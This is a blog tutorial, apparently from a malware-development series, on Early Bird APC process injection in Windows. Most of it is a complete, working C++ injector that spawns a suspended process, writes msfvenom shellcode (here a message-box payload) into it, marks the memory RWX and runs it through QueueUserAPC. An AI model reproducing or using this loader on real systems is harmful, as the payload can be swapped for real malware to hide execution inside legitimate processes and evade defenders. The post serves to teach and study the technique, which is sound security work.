---
title: "Early Bird code injection: Executing shellcode through early initialization."
date: 2025-07-16 20:12:34 +0200
categories: [Maldev, Process Injection]
tags: [Process Injection, Maldev, Windows, User-Mode]     # TAG names should always be lowercase
image: assets/EarlyBird_Code/0309(1).png
---

## **Overview**

Early Bird is a process injection technique that was first discovered in 2018 by the research lab of the cybersecurity company Cyberbit and has been used by multiple threat actors and APT groups to inject arbitray code often into legitimate system processes (e.g., `svchost.exe`, `explorer.exe`).
The execution logic of this technique involves creating a process in a suspended state using the `PROCESS_SUSPENDED` flag, allocating memory for the newly created process, and queue an Asynchronous Procedure Call `(APC)` in the main thread of the suspended process. Then, the thread is resumed, and the shellcode is executed.

## **Execution flow**

- #### **Crafting a custom function to spawn a process in a suspended state:** ####

Defines a custom `CreateTargetProcess` function to create a process in a suspended state by calling `CreateProcessW` with the `CREATE_SUSPENDED` flag. This ensures that the process's main thread does not execute until `ResumeThread` is called.

The function takes four parameters `(hProcess, hThread, lpBuffer, and processName)`, which are declared at the entry point of the main function (e.g., int main() ). The `processName` parameter has a default value if not specified in the function call.

{% highlight CPP %}
BOOL CreateTargetProcess(HANDLE* hProcess, HANDLE* hThread, LPVOID* lpBuffer, const std::wstring& processName=L"C:\\Windows\\System32\\notepad.exe")
{
    std::cout << "[*] Trying to create process..." << std::endl;

    STARTUPINFOW startInfo{ NULL };
    PROCESS_INFORMATION processInfo{ NULL };

    // note the CREATE_SUSPENDED creation flag
    if(CreateProcessW(processName.data(), NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &startInfo, &processInfo))
    {
        *hProcess = processInfo.hProcess; 
        *hThread = processInfo.hThread;

        std::cout << "\\n[+] Process Handle: 0x" << *hProcess << std::endl;
        std::cout << "[+] Thread Handle: 0x" << *hThread << std::endl;

        try
        {
            *lpBuffer = MemoryAllocation(*hProcess);
            if(!*lpBuffer)
            {
                SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), COLOR_RED);
                std::cerr << "\\t[-] Failed to completion CreateTargetProcess()" << std::endl;
                SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), COLOR_RESET);
                throw FALSE;
            }
        }
        catch(BOOL x)
        {
            DWORD dwExitCode { NULL };
            if(*lpBuffer)
                VirtualFreeEx(*hProcess, *lpBuffer, 0, MEM_RELEASE);
            
            TerminateProcess(*hProcess, GetExitCodeProcess(*hProcess, &dwExitCode));
            return x;
        }
    }
    else
    {
        SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), COLOR_RED);
        std::cerr << "[-] Failed to create target process with error: 0x" << GetLastError();
        SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), COLOR_RED);
        return FALSE;
    }

    return TRUE;
}
{% endhighlight %}

- **PROCESSUPINFOW:** This structure is declared to set the necessary configurations when creating a new process.
- **PROCESS_INFORMATION:** This is used to receive the necessary information about the newly created process and its primary thread.
- **CreateProcessW:** This is the main function of the Windows API to create a process and its main thread.
  - **processName.data():** The name and path of the executable image to be executed.
  - **CREATE_SUSPENDED:** This flag specifies that the process and its main thread remain in a suspended state.

- **MemoryAllocation:** This is the custom function which will be described in the next step.

Additionally, a `try-catch` block was added to handle exceptions and free resources. `TerminateProcess` is included to terminate the process if something unexpected occurs.

- #### **Crafting a custom function to allocate remote memory:** ####

`MemoryAllocation` is used to allocate memory in the process's address space and copy the shellcode to that location using WriteProcessMemory.

{% highlight CPP %}
// allocates and write shellcode in target process
LPVOID MemoryAllocation(HANDLE hProcess)
{
    SIZE_T cbSize { sizeof(payload) };
    LPVOID lpBuffer { nullptr };

    if( !(lpBuffer = VirtualAllocEx(hProcess, NULL, cbSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) )
        return nullptr;
    
    std::cout << "\n[+] Allocating memory: 0x" << lpBuffer << std::endl;

    // Write shellcode to remote buffer in target process
    if(!WriteProcessMemory(hProcess, lpBuffer, payload, cbSize, NULL))
    {
        SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), COLOR_RED);
        std::cerr << "\t[-] Failed to write shellcode into the target process's address space: 0x" << lpBuffer << std::endl;
        SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), COLOR_RESET);

        VirtualFreeEx(hProcess, lpBuffer, 0, MEM_RELEASE);
        return nullptr;
    }

    return lpBuffer;   
}
{% endhighlight %}

- **VirtualAllocEx:** It is used to allocate memory in the address space of a specific remote process.
  - **hProcess:** The process handle obtained by calling `CreateProcessW`.
  - **cbSize:** The size of payload in bytes.
  - **MEM_COMMIT \| MEM_RESERVE:** The type of allocation for the memory region is specified.
  - **PAGE_READWRITE:** The memory protection of the memory region.
- **WriteProcessMemory:** It is used to write the shellcode into the previously allocated memory buffer.

**Note:** Be aware, if the function succeeds it returns a memory buffer to the caller, otherwise it returns a null pointer.

- **Program entry point:**

The code segment below belongs to the main entry point of our program, where we call the `QueueUserAPC` and `ResumeThread` functions.

{% highlight CPP %}

    PTHREAD_START_ROUTINE APCroutine { static_cast<PTHREAD_START_ROUTINE>(lpBuffer) };
    if(!QueueUserAPC((PAPCFUNC)APCroutine, hThread, NULL))
    {
        SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), COLOR_RED);
        std::cerr << "\\t[-] Failed to queue the APC in the primary thread: 0x" << hThread << std::endl;
        SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), COLOR_RESET);

        VirtualFreeEx(hProcess, lpBuffer, 0, MEM_RELEASE);
        TerminateProcess(hProcess, GetExitCodeProcess(hProcess, &dwExitCode));
        return 1;
    }

    bMemProtect = VirtualProtectEx(hProcess, lpBuffer, sizeof(payload), PAGE_EXECUTE_READWRITE, &dwOldProtect);
    if(bMemProtect)
    {
        std::cout << "[+] Change memory protection from RW to RWX: 0x" << lpBuffer << "->RWX" << std::endl;
        std::cout << "[+] Queuing APC in thread: 0x" << hThread << std::endl;
        std::cout << "[+] Resume thread and executing shellcode in target process!" << std::endl;
        ResumeThread(hThread);
        system("pause");
    }
    {% endhighlight %}

- **QueueUserAPC:** It is used to queue an `APC` (Asynchronous Procedure Call) object in a thread. Note that before the APC executes, the thread must be in an alertable state, so we call ResumeThread.
  - **(PAPCFUNC)APCroutine:** An APC routine with the address of the buffer containing the payload/shellcode to be executed.
  - **hThread:** A handle to the main thread of the target process. You get that by calling the `CreateTargetProcess` function.
- **ResumeThread:** Checks the suspend count of a suspended process, decrements it to zero, and resumes thread execution.
- **VirtualProtecEx:** Change memory protection from RW to RWX to be able to execute shellcode.
  - **hProcess:** The process handle obtained by calling CreateProcessW.
  - **lpBuffer:** The memory buffer where the payload/shellcode is.
  - **sizeof(payload):** Size of payload in bytes.

## **Full code:**

{% highlight CPP %}
#include <Windows.h>
#include <iostream>

#define COLOR_GREEN 2
#define COLOR_RED 4
#define COLOR_RESET 7 


// referencias
// https://0xmani.medium.com/early-bird-injection-05027fbfb794
// https://www.seguridad.unam.mx/ciberatacantes-utilizan-nueva-tecnica-de-inyeccion-de-codigo
// https://www.cyberbit.com/endpoint-security/new-early-bird-code-injection-technique-discovered/ 
// https://www.ired.team/offensive-security/code-injection-process-injection/early-bird-apc-queue-code-injection
// https://threatpost.com/new-early-bird-code-injection-technique-helps-apt33-evade-detection/131147/

//msfvenom -p windows/x64/messagebox TEXT="System_0x04" TITLE='Early bird Injection!' -f c  
unsigned char payload[] = {
    "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
    "\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
    "\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
    "\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
    "\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
    "\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
    "\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
    "\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
    "\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
    "\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
    "\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
    "\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
    "\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
    "\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
    "\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
    "\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x3e\x48"
    "\x8d\x8d\x30\x01\x00\x00\x41\xba\x4c\x77\x26\x07\xff\xd5"
    "\x49\xc7\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x0e\x01\x00"
    "\x00\x3e\x4c\x8d\x85\x1a\x01\x00\x00\x48\x31\xc9\x41\xba"
    "\x45\x83\x56\x07\xff\xd5\x48\x31\xc9\x41\xba\xf0\xb5\xa2"
    "\x56\xff\xd5\x53\x79\x73\x74\x65\x6d\x5f\x30\x78\x30\x34"
    "\x00\x45\x61\x72\x6c\x79\x20\x62\x69\x72\x64\x20\x49\x6e"
    "\x6a\x65\x63\x74\x69\x6f\x6e\x21\x00\x75\x73\x65\x72\x33"
    "\x32\x2e\x64\x6c\x6c\x00"

};

// allocates and write shellcode in target process
LPVOID MemoryAllocation(HANDLE hProcess)
{
    SIZE_T cbSize { sizeof(payload) };
    LPVOID lpBuffer { nullptr };

    if( !(lpBuffer = VirtualAllocEx(hProcess, NULL, cbSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) )
        return nullptr;
    
    std::cout << "\n[+] Allocating memory: 0x" << lpBuffer << std::endl;

    // Write shellcode to remote buffer in target process
    if(!WriteProcessMemory(hProcess, lpBuffer, payload, cbSize, NULL))
    {
        SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), COLOR_RED);
        std::cerr << "\t[-] Failed to write shellcode into the target process's address space: 0x" << lpBuffer << std::endl;
        SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), COLOR_RESET);

        VirtualFreeEx(hProcess, lpBuffer, 0, MEM_RELEASE);
        return nullptr;
    }

    return lpBuffer;   
}


BOOL CreateTargetProcess(HANDLE* hProcess, HANDLE* hThread, LPVOID* lpBuffer, const std::wstring& processName=L"C:\\Windows\\System32\\notepad.exe")
{
    std::cout << "[*] Trying to create process..." << std::endl;

    STARTUPINFOW startInfo{ NULL };
    PROCESS_INFORMATION processInfo{ NULL };

    // note the CREATE_SUSPENDED creation flag
    if(CreateProcessW(processName.data(), NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &startInfo, &processInfo))
    {
        *hProcess = processInfo.hProcess; 
        *hThread = processInfo.hThread;

        std::cout << "\\n[+] Process Handle: 0x" << *hProcess << std::endl;
        std::cout << "[+] Thread Handle: 0x" << *hThread << std::endl;

        try
        {
            *lpBuffer = MemoryAllocation(*hProcess);
            if(!*lpBuffer)
            {
                SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), COLOR_RED);
                std::cerr << "\\t[-] Failed to completion CreateTargetProcess()" << std::endl;
                SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), COLOR_RESET);
                throw FALSE;
            }
        }
        catch(BOOL x)
        {
            DWORD dwExitCode { NULL };
            if(*lpBuffer)
                VirtualFreeEx(*hProcess, *lpBuffer, 0, MEM_RELEASE);
            
            TerminateProcess(*hProcess, GetExitCodeProcess(*hProcess, &dwExitCode));
            return x;
        }
    }
    else
    {
        SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), COLOR_RED);
        std::cerr << "[-] Failed to create target process with error: 0x" << GetLastError();
        SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), COLOR_RED);
        return FALSE;
    }

    return TRUE;
}

int main()
{
    std::wstring processName { L"C:\\Windows\\System32\\mspaint.exe" };
    LPVOID lpBuffer { nullptr };
    HANDLE hThread { nullptr };
    HANDLE hProcess { nullptr };
    DWORD dwExitCode { NULL }, dwOldProtect { NULL };
    BOOL bMemProtect { NULL };

    SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), COLOR_GREEN);
    std::cout << "[*] Initializing Early Bird code injection!" << std::endl;

    if(!CreateTargetProcess(&hProcess, &hThread, &lpBuffer, processName))
        return 1;

    PTHREAD_START_ROUTINE APCroutine { static_cast<PTHREAD_START_ROUTINE>(lpBuffer) };
    if(!QueueUserAPC((PAPCFUNC)APCroutine, hThread, NULL))
    {
        SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), COLOR_RED);
        std::cerr << "\\t[-] Failed to queue the APC in the primary thread: 0x" << hThread << std::endl;
        SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), COLOR_RESET);

        VirtualFreeEx(hProcess, lpBuffer, 0, MEM_RELEASE);
        TerminateProcess(hProcess, GetExitCodeProcess(hProcess, &dwExitCode));
        return 1;
    }

    bMemProtect = VirtualProtectEx(hProcess, lpBuffer, sizeof(payload), PAGE_EXECUTE_READWRITE, &dwOldProtect);
    if(bMemProtect)
    {
        std::cout << "[+] Change memory protection from RW to RWX: 0x" << lpBuffer << "->RWX" << std::endl;
        std::cout << "[+] Queuing APC in thread: 0x" << hThread << std::endl;
        std::cout << "[+] Resume thread and executing shellcode in target process!" << std::endl;
        ResumeThread(hThread);
        system("pause");
    }
    
    // Cleaning up resources
    std::cout << "\\n[+] Cleaning up resource....!" << std::endl;
    SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), COLOR_RESET);
    VirtualFreeEx(hProcess, lpBuffer, 0, MEM_RELEASE);
    CloseHandle(hThread);
    CloseHandle(hProcess);

    EXIT_SUCCESS;
}
{% endhighlight %}


We can check it with the Process Explorer tool that the newly created process is in a suspended state.

![img-description](assets/EarlyBird_Code/EarlyBird_code.jpg)

It is also possible to check this with the built-in Windows utility "Performance Monitor".

![img-description](assets/EarlyBird_Code/EarlyBird_Code1.jpg)

In the graph, it is possible to see that the process thread is at state level 5, which internally corresponds to a thread in a waiting state, waiting for an event to synchronize its execution.

The end result is the execution of arbitrary code in a process by using the Windows APC mechanism.

![img-description](assets/EarlyBird_Code/EarlyBird_Code2.jpg)

## **Summary:**

To conclude this series, the most important steps in this technique will be analyzed, which are:

- Create a process in a suspended state by calling `CreateProcessW` and using the `CREATE_SUSPENDED` flag.
- Allocate memory in the target process using `VirtualAllocEx`, passing `PAGE_READWRITE` as a parameter for read/write (RW) operations only.
- Queueing an APC with `QueueUserAPC`.
- Change memory protection to RWX with `VirtualProtectEx`.
- Resume the thread and execute the shellcode.

**References:**

- https://0xmani.medium.com/early-bird-injection-05027fbfb794
- https://www.seguridad.unam.mx/ciberatacantes-utilizan-nueva-tecnica-de-inyeccion-de-codigo
- https://www.cyberbit.com/endpoint-security/new-early-bird-code-injection-technique-discovered/
- https://www.ired.team/offensive-security/code-injection-process-injection/early-bird-apc-queue-code-injection
- https://threatpost.com/new-early-bird-code-injection-technique-helps-apt33-evade-detection/131147/
